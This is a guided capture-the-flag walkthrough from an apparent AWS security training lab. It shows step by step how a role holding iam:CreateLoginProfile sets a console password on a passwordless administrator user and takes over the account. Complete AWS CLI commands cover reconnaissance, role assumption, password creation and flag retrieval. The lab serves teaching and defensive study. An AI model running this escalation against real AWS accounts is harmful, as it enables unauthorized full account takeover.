# Guided Walkthrough: Privilege Escalation via iam:CreateLoginProfile

This scenario demonstrates a privilege escalation vulnerability where a role has permission to create login profiles (console passwords) for an administrator user. An attacker can assume a role with `iam:CreateLoginProfile` permission on an admin user who lacks a console password, create a login profile with a password they control, and then use those credentials to access the AWS Management Console with full administrator privileges.

This attack vector is particularly dangerous because many organizations focus on protecting API access keys while overlooking console access. Admin users created for programmatic access often have the `AdministratorAccess` policy but no login profile, making them ideal targets for this technique. Once a login profile is created, the attacker gains interactive console access, which can bypass monitoring systems focused on API-based actions and provides a user-friendly interface for lateral movement and data exfiltration.

The vulnerability commonly occurs when organizations grant broad IAM management permissions without restricting them to specific operations, or when least privilege principles are not applied to credential management permissions.

## The Challenge

You start as `pl-prod-iam-004-to-admin-starting-user`, an IAM user whose credentials were provided via Terraform outputs. This user has no meaningful permissions on its own — its only interesting capability is that it can assume `pl-prod-iam-004-to-admin-starting-role`.

Your target is `pl-prod-iam-004-to-admin-target-user`, an IAM user with `AdministratorAccess` attached but — critically — no console login profile configured. The admin user exists purely for programmatic access, so nobody thought to restrict who could set a password on it.

Your goal: gain administrator-level access to this AWS account.

## Reconnaissance

First, let's confirm who you are and verify your starting position:

```bash
export AWS_ACCESS_KEY_ID="<starting_user_access_key_id>"
export AWS_SECRET_ACCESS_KEY="<starting_user_secret_access_key>"
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
```

Now, use the helpful permissions available to your starting user (or the role you're about to assume) to survey the landscape. Check whether the target admin user has a login profile:

```bash
aws iam get-login-profile --user-name pl-prod-iam-004-to-admin-target-user
```

A `NoSuchEntity` error confirms there is no login profile — the user is a silent target. You can also enumerate users to find candidates:

```bash
aws iam list-users
```

## Exploitation

### Step 1: Assume the starting role

The starting user can assume `pl-prod-iam-004-to-admin-starting-role`, which holds the `iam:CreateLoginProfile` permission on the target user. Assume that role:

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::{account_id}:role/pl-prod-iam-004-to-admin-starting-role \
  --role-session-name iam-004-attack-session
```

Export the returned temporary credentials:

```bash
export AWS_ACCESS_KEY_ID="<AccessKeyId from output>"
export AWS_SECRET_ACCESS_KEY="<SecretAccessKey from output>"
export AWS_SESSION_TOKEN="<SessionToken from output>"
```

Confirm you're now operating as the role:

```bash
aws sts get-caller-identity
```

### Step 2: Create a login profile for the admin user

Now that you hold `iam:CreateLoginProfile` via the role, create a console password for the admin user. Pick a strong password that you control:

```bash
aws iam create-login-profile \
  --user-name pl-prod-iam-004-to-admin-target-user \
  --password 'AttackP@ssw0rd!' \
  --no-password-reset-required
```

This succeeds because the admin user has no existing login profile. AWS requires `--no-password-reset-required` to prevent AWS from forcing a password change on first login — without it, you'd be prompted to reset the password immediately after logging in, adding friction.

## Verification

With the login profile created, navigate to the AWS Management Console sign-in page for the account. Use the target user's username (`pl-prod-iam-004-to-admin-target-user`) and the password you just set.

Alternatively, verify admin access programmatically by switching to the target user's credentials and confirming unrestricted IAM access:

```bash
# Unset role credentials first
unset AWS_SESSION_TOKEN

export AWS_ACCESS_KEY_ID="<target_user_access_key_if_available>"
export AWS_SECRET_ACCESS_KEY="<target_user_secret_key_if_available>"

aws iam list-users
aws iam list-roles
aws iam list-policies --scope Local
```

Successful responses confirm full `AdministratorAccess`.

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy attached to `pl-prod-iam-004-to-admin-target-user` provides implicitly.

Using the target admin user's API credentials (issued by Terraform alongside the console password you just created) — or using any principal that now holds administrator-equivalent permissions — read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/iam-004-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You exploited a one-hop privilege escalation path:

1. `pl-prod-iam-004-to-admin-starting-user` assumed `pl-prod-iam-004-to-admin-starting-role`
2. The role used `iam:CreateLoginProfile` to set a console password on `pl-prod-iam-004-to-admin-target-user`
3. The admin user — previously only accessible via programmatic keys — now had an active console password under your control

In real environments, this pattern is surprisingly common. Organizations create IAM users with `AdministratorAccess` for automation or break-glass scenarios, configure them without login profiles, and then grant `iam:CreateLoginProfile` to other roles (e.g., an "IAM admin" role) without scoping it to specific resource targets. A compromised IAM admin role becomes an instant path to full account takeover via console access — often without triggering alerts focused on API-based escalation paths like `iam:CreateAccessKey`.
